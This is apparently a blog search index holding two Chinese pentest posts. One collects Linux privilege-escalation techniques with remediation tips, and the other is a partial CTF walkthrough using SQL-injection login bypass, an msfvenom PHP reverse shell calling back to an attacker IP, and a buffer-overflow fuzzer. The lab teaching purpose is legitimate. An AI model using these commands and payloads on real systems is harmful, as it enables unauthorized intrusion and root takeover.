<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Linux特权提升技术合集</title>
      <link href="2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/"/>
      <url>2020/12/25/Linux%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87%E6%8A%80%E6%9C%AF%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux提权技术合集"><a href="#Linux提权技术合集" class="headerlink" title="Linux提权技术合集"></a>Linux提权技术合集</h1><h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机IP：192.168.56.105</p><p>靶机IP：192.168.56.117</p><p>用户：muhammad 密码：nasef</p><p>说明：教程中有运用其他环境，都是我以往使用的特权提升技术。</p><h2 id="sudo查看"><a href="#sudo查看" class="headerlink" title="sudo查看"></a>sudo查看</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe544eca18d5" alt="image-20201222194319348"></p><h2 id="apt-get权限滥用特权提升"><a href="#apt-get权限滥用特权提升" class="headerlink" title="apt-get权限滥用特权提升"></a>apt-get权限滥用特权提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update -o APT::Update::Pre-Invoke::&#x3D;&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe544f337145" alt="image-20201222194749860"></p><p>提权完成</p><p>修补建议：为适当的文件设置适当的权限。在这种情况下，请修改/ etc / sudoers 降低不必要的权限。</p><h2 id="二进制程序权限滥用"><a href="#二进制程序权限滥用" class="headerlink" title="二进制程序权限滥用"></a>二进制程序权限滥用</h2><p>该二进制文件有源代码，源代码上面是执行一个shell出来。在sudo中，这个程序不需要root密码即可运行，所以我们使用sudo来运行该二进制文件即可提权。</p><p><img src="https://img.rruu.net/image/5fe544f9441ae" alt="image-20201222194836884"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;sudo</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe544fe8a8d4" alt="image-20201222195029811"></p><p>修补建议：为适当的文件设置适当的权限。在这种情况下，请修改/ etc / sudoers 降低不必要的权限。</p><h2 id="ssh私钥泄露提权"><a href="#ssh私钥泄露提权" class="headerlink" title="ssh私钥泄露提权"></a>ssh私钥泄露提权</h2><p>来到vuln的3目录看见一个key，一眼看出来是一个私钥。推测是root用户的key，我们使用root ssh连接一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat key</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54503cc858" alt="image-20201222200120693"></p><p>保存到kali下</p><p><img src="https://img.rruu.net/image/5fe5450ae70a3" alt="image-20201222200222569"></p><p>要给id_rsa 600权限，要不然读取不到。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54511eb892" alt="image-20201222200317346"></p><p>ssh key连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.56.117 -i .&#x2F;id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54516c18e9" alt="image-20201222200406692"></p><p>修补办法：将私钥删除。</p><h2 id="shadow文件可读"><a href="#shadow文件可读" class="headerlink" title="shadow文件可读"></a>shadow文件可读</h2><p>查找shadow文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la &#x2F;etc&#x2F; | grep shadow</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5451ba6de3" alt="image-20201222202957585"></p><p>读一下shadow文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545204382b" alt="image-20201222203036115"></p><p>发现root密码，我们将root进行破解。</p><p><img src="https://img.rruu.net/image/5fe5452613f35" alt="image-20201222203151280"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5452b5428e" alt="image-20201222203211883"></p><p>获得root密码，su切换root用户完成提权。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54530c914f" alt="image-20201222203329457"></p><p>修补建议：为适当的文件设置适当的权限。在这种情况下，我们应该删除其他用户的阅读权限。</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>搜索具有suid权限的可执行文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54535e5bb7" alt="image-20201222205416808"></p><h3 id="二进制程序权限滥用特权提升"><a href="#二进制程序权限滥用特权提升" class="headerlink" title="二进制程序权限滥用特权提升"></a>二进制程序权限滥用特权提升</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;muhammad&#x2F;vuln&#x2F;1&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5453c1a84b" alt="image-20201222205518447"></p><p>这个suid文件，执行之后会有一个shell返回，这个shell是具有root权限的。id查看权限，不是root，但是对/etc/passwd有读写权限，我们来添加一个root用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;suid</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54540d7b52" alt="image-20201222205616725"></p><p>切回kali，生成密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545479fd08" alt="image-20201222205837567"></p><p>复制目标/etc/passwd到kali下，将我们生成的密码，按照格式写入。</p><p><img src="https://img.rruu.net/image/5fe5454ef3b5d" alt="image-20201222210710593"></p><p>python开启http服务器，使用wget覆盖/etc/passwd。</p><p><img src="https://img.rruu.net/image/5fe5455545346" alt="image-20201222210749391"></p><p>靶机执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5455aec55c" alt="image-20201222210813978"></p><p>退出当前shell，切换magisec用户，密码123456。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5456077ef6" alt="image-20201222210836258"></p><p>修复建议：取消suid文件suid权限</p><h3 id="php特权提升"><a href="#php特权提升" class="headerlink" title="php特权提升"></a>php特权提升</h3><p><img src="https://img.rruu.net/image/5fe3fc9f222a0" alt="image-20201219140613095"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/5fe3fca60826e" alt="image-20201219140653525"></p><h3 id="cp提权"><a href="#cp提权" class="headerlink" title="cp提权"></a>cp提权</h3><p>将靶机的passwd文件，拷贝到kali上面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>openssl生成密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545722068f" alt="image-20201222211645651"></p><p>python启动http服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54576e52c7" alt="image-20201222211727438"></p><p>wget下载passwd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5457ba94e2" alt="image-20201222211906351"></p><p>cp命令覆盖/etc/passwd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .&#x2F;passwd &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54580b5f34" alt="image-20201222211959262"></p><p>提权完成</p><p>修复建议：将cp的suid去除</p><h2 id="CRONJOBS特权提升"><a href="#CRONJOBS特权提升" class="headerlink" title="CRONJOBS特权提升"></a>CRONJOBS特权提升</h2><p>查看计划任务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;crontab</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545857cbdd" alt="image-20201223095546811"></p><p>发现系统每一分钟以root权限执行script.sh。我去跟进去看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat script.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5458c09151" alt="image-20201223095701572"></p><p>查看权限，发现我们对passwd和script都有读写权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545914f8a2" alt="image-20201223095816820"></p><p>我们看一下script的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .&#x2F;script.sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54595ccec1" alt="image-20201223095934163"></p><p>发现，他使用passwd文件覆盖了系统自带的passwd文件，我们对passwd文件有权限，所以我们可以添加一个root权限的用户。切回kali，生成密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5459ad4d0b" alt="image-20201223100129793"></p><p>切回靶机ssh连接，修改passwd文件，修改为这样。</p><p><img src="https://img.rruu.net/image/5fe545a01c4da" alt="image-20201223100151022"></p><p>等待系统执行，我们就可以添加一个用户了。需要一分钟。</p><p><img src="https://img.rruu.net/image/5fe545a652be3" alt="image-20201223100327619"></p><p>我们su切换magisec用户，密码123456.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su magisec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545ac517c8" alt="image-20201223100409684"></p><p>修复建议：建议将passwd文件与script权限降低，不给普通用户写权限。</p><h2 id="NFS特权提升"><a href="#NFS特权提升" class="headerlink" title="NFS特权提升"></a>NFS特权提升</h2><p>查看靶机挂载目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">showmount -e 192.168.56.117</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545b13c523" alt="image-20201223100926200"></p><p>将目标靶机nfs目录挂载到mnt目录中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs 192.168.56.117:&#x2F;home&#x2F;muhammad &#x2F;mnt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545b6bcb8f" alt="image-20201223102404945"></p><p>创建setuid</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;exp.c</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545bc5373d" alt="image-20201223103537054"></p><p>gcc编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545c0f0cec" alt="image-20201223104151886"></p><p>复制到/mnt目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp .&#x2F;exp &#x2F;mnt&#x2F;exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545c6d31a6" alt="image-20201223104243518"></p><p>查看/mnt目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545cce75e5" alt="image-20201223104302095"></p><p>赋予suid权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x .&#x2F;exp</span><br></pre></td></tr></table></figure><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20201223104326335.png" alt="image-20201223104326335"  /><p>切回靶机，执行exp命令，看id依旧是普通用户，但是此时我们已经具有root权限了，如果要深入利用，可以参考我上面用的passwd攻击手法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;exp</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545d1bbeae" alt="image-20201223104402814"></p><p>修复建议：合理配置nfs权限，禁止写入。</p><h2 id="历史记录密码泄露"><a href="#历史记录密码泄露" class="headerlink" title="历史记录密码泄露"></a>历史记录密码泄露</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545d67be4f" alt="image-20201223104548656"></p><p>可以看到密码泄露，su切换root用户。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><p>修复建议：清除历史记录，不直接再命令行中使用密码。</p><h2 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2><p>查看内核版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545db5d78b" alt="image-20201223104945982"></p><p>使用脏牛提权，使用exploit-db的exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux&#x2F;local&#x2F;40839.c -m</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545e03713b" alt="image-20201223111219838"></p><p>使用gcc编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe545e4e7105" alt="image-20201223111328476"></p><p>回传到靶机上</p><p><img src="https://img.rruu.net/image/5fe545e985f32" alt="image-20201223111355938"></p><p>su切换firefart用户</p><p><img src="https://img.rruu.net/image/5fe545ef36cb6" alt="image-20201223111416558"></p><p>发现firefart用户是root组，至此提权完成。</p><p>修复建议：升级内核版本，使用最新版本的ubuntu。</p><h2 id="lxc提权"><a href="#lxc提权" class="headerlink" title="lxc提权"></a>lxc提权</h2><p>id查看用户基本信息，发现在lxd用户组，使用lxd提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e081c" alt="image-20201218101628436"></p><p>github构建提权环境</p><p><a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;build-alpine</span><br></pre></td></tr></table></figure><p>然后回自动生成一个tar.gz文件，重命名成t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv alpine-v3.12-x86_64-20201217_1534.tar.gz t.tar.gz</span><br></pre></td></tr></table></figure><p>将t.tar.gz文件传输到目标主机上面，使用python开启http服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure><p>目标主机使用wget下载t.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.105&#x2F;t.tar.gz</span><br></pre></td></tr></table></figure><p>需要先初始化环境 一切默认</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxd init</span><br></pre></td></tr></table></figure><p>查看一下image</p><p><img src="https://img.rruu.net/image/5fe32828df765" alt="image-20201218102502019"></p><p>发现没有任何镜像，我们导入一下镜像，然后再次查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc image import .&#x2F;t.tar.gz --alias dmagicsec</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e4998" alt="image-20201218102541247"></p><p>初始化容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc init dmagicsec dmagicsec -c security.privileged&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828df9f4" alt="image-20201218103022044"></p><p>映射容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc config device add dmagicsec dmagicsec disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e15a6" alt="image-20201218103045116"></p><p>启动容器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc start dmagicsec</span><br></pre></td></tr></table></figure><p>执行交互shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxc exec dmagicsec &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe32828e3975" alt="image-20201218103123276"></p><p>获取flag</p><p><img src="https://img.rruu.net/image/5fe5460ce8282" alt="image-20201218103254958"></p><h2 id="docker权限提升"><a href="#docker权限提升" class="headerlink" title="docker权限提升"></a>docker权限提升</h2><p>查看id属于docker组，我们使用docker提权。</p><p><img src="https://img.rruu.net/image/5fe5461256c83" alt="image-20201221111957878"></p><p>提升权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm -v &#x2F;:&#x2F;mnt bash</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe54616dacf5" alt="image-20201221112029286"></p><p>思路：目前我们将目标靶机的整盘目录挂载到了docker中，且在/mnt目录下，我们修改/mnt目录下面的文件，会直接影响到靶机。所以我们修改/etc/passwd文件，添加root权限用户。</p><p>生成密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opensll passwd -1 -salt magisec 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5461b85e5e" alt="image-20201221121258488"></p><p>进入我们刚刚root权限的虚拟容器shell，添加用户。格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;mnt&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe546206c6a7" alt="image-20201221121420566"></p><p>查看flag文件</p><p><img src="https://img.rruu.net/image/5fe54626beec6" alt="image-20201221121612040"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>school</title>
      <link href="2020/12/25/school/"/>
      <url>2020/12/25/school/</url>
      
        <content type="html"><![CDATA[<h2 id="环境情况"><a href="#环境情况" class="headerlink" title="环境情况"></a>环境情况</h2><p>攻击机：192.168.56.105</p><p>靶机：192.168.56.121</p><p>这篇文章写的不是特别好，如果缓冲区没有看懂的，可以私信我，我会为你解答。QQ：2933653699</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap扫描"><a href="#Nmap扫描" class="headerlink" title="Nmap扫描"></a>Nmap扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -n -sV -p- -oN school.nmap 192.168.56.121</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe5429e0a998" alt="image-20201224201910918"></p><p>开放 22 23 80</p><p>22 ssh</p><p>23 未知 nmap猜测是telnet，自己测试使用telnet无法连接。</p><p>80 web</p><p>渗透思路：通过80端口getshell，反弹shell回来进行提权。</p><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>firefox打开</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox http:&#x2F;&#x2F;192.168.56.121</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542a3c7de8" alt="image-20201224202505086"></p><p>gobuster扫描目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.121 -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542a950877" alt="image-20201224203002654"></p><p>没有啥结果，我们扫一下student_attendance</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -t 100 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt -e -l -u http:&#x2F;&#x2F;192.168.56.121&#x2F;student_attendance&#x2F; -o dir.txt</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542aec8713" alt="image-20201224203153421"></p><p>查看database目录</p><p><img src="https://img.rruu.net/image/5fe542b43bba5" alt="image-20201224203218267"></p><p>将文件下载下来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.121&#x2F;student_attendance&#x2F;database&#x2F;student_attendance_db.sql</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542baf2edb" alt="image-20201224203255258"></p><p>发现一个用户名</p><p><img src="https://img.rruu.net/image/5fe542c01d1a5" alt="image-20201224203516697"></p><p>没有任何价值，尝试登录失败。看来数据库文件没有啥用，我们尝试对网站进行漏洞攻击。</p><h3 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h3><p>手工使用万能密码进行检测，存在注入漏洞，我们可以直接进入系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542c573099" alt="image-20201224203631417"></p><h2 id="网站后台getshell"><a href="#网站后台getshell" class="headerlink" title="网站后台getshell"></a>网站后台getshell</h2><p>简单查看，未发现上传点。右键源代码，发现上传点。</p><p><img src="https://img.rruu.net/image/5fe542ca33d36" alt="image-20201224204029049"></p><p>msf生成phpshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.56.105 LPORT&#x3D;9000 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure><p>上传到网站上</p><p><img src="https://img.rruu.net/image/5fe542cf4ecff" alt="image-20201224234057152"></p><p>直接上传，他会自己运行的。返回了shell</p><p><img src="https://img.rruu.net/image/5fe542d4752cf" alt="image-20201224234144634"></p><p>拿到第一个flag</p><p><img src="https://img.rruu.net/image/5fe542da2ac06" alt="image-20201224234229326"></p><h2 id="特权提升"><a href="#特权提升" class="headerlink" title="特权提升"></a>特权提升</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>查找网站配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat db_connect.php</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542df6dd9e" alt="image-20201224234506919"></p><p>尝试ssh su切换用户均失败</p><p><img src="https://img.rruu.net/image/5fe542e4b00ab" alt="image-20201224234909519"></p><p>尝试suid提权失败</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -type f -perm -u&#x3D;s 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542ea8c710" alt="image-20201224235154430"></p><p>目前来说，提权是不太可能提权的，我们继续做信息收集。前往root目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542f009c8c" alt="image-20201224235309605"></p><p>没有权限，但是我们发现了win文件，很奇怪，我们去看看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat win</span><br></pre></td></tr></table></figure><p><img src="https://img.rruu.net/image/5fe542f7223c9" alt="image-20201224235403168"></p><p>使用wine去运行exe文件，以root权限，我们下载下来到windows上分析一下该exe。</p><p><img src="https://img.rruu.net/image/5fe542fc442e0" alt="image-20201224235505559"></p><h3 id="审计exe文件"><a href="#审计exe文件" class="headerlink" title="审计exe文件"></a>审计exe文件</h3><p>这个文件是这样的，他会开启这个23端口，然后接受23端口输出。我们尝试缓冲区溢出。使用python编写fuzz缓冲区最大值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import socket,time</span><br><span class="line"></span><br><span class="line">num &#x3D; 5</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        buffer &#x3D; b&quot;A&quot; * num</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((&quot;192.168.132.144&quot;,23))</span><br><span class="line">        s.send((buffer))</span><br><span class="line">        s.recv(1024)</span><br><span class="line">        s.close()</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        print(&quot;[*]Payload is %i As&quot; % (num))</span><br><span class="line">        num +&#x3D; 5</span><br><span class="line">except:</span><br><span class="line">    print(&quot;[*]Payload is %i As&quot; % (num-5))</span><br></pre></td></tr></table></figure><p>确定缓冲区准确值为1900。</p><p><img src="https://img.rruu.net/image/5fe543017bc8d" alt="image-20201225000620036"></p><h3 id="缓冲区溢出exp编写"><a href="#缓冲区溢出exp编写" class="headerlink" title="缓冲区溢出exp编写"></a>缓冲区溢出exp编写</h3><p>我们使用x32dbg调试程序，进一步利用。</p><p><img src="https://img.rruu.net/image/5fe5430668937" 